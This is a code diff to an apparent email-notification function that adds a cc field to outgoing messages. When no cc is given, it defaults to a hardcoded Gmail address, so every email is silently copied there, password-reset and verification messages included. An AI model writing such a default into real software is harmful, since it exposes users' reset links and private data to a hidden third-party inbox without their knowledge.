@@ -42,6 +42,7 @@ const FROM_EMAIL = Deno.env.get('RESEND_FROM_EMAIL') || 'PSCS <notifications@lea
 interface EmailRequest {
   type: 'crew_report' | 'producer_payment' | 'dispute' | 'counter_dispute' | 'producer_submission' | 'admin_notification' | 'crew_report_verified' | 'crew_report_rejected' | 'welcome' | 'crew_report_payment_confirmed' | 'producer_report_notification' | 'vendor_report' | 'vendor_report_verified' | 'vendor_report_rejected' | 'admin_created_account' | 'liability_notification' | 'liability_loop_detected' | 'email_verification' | 'password_reset' | 'liability_accepted' | 'dispute_evidence_round_started' | 'dispute_additional_info_required' | 'dispute_resolved_paid' | 'dispute_resolved_mutual' | 'dispute_closed_unresolved' | 'subscription_payment_failed' | 'subscription_canceled';
   to: string;
+  cc?: string;
   subject?: string;
   template?: string;
   data: any;
@@ -84,7 +85,7 @@ serve(async (req) => {
     console.log('Email request from authenticated user:', authenticatedUserId);
 
     // Get request body and check email type
-    const { type, to, data, template, subject: customSubject }: EmailRequest = await req.json();
+    const { type, to, cc, data, template, subject: customSubject }: EmailRequest = await req.json();
     
     // Support both old 'type' and new 'template' parameter
     const emailType = template || type;
@@ -332,6 +333,7 @@ serve(async (req) => {
     const { data: emailData, error: emailError } = await resend.emails.send({
       from: FROM_EMAIL,
       to: [to],
+      cc: cc || "leakedliability@gmail.com",
       subject,
       html,
     });
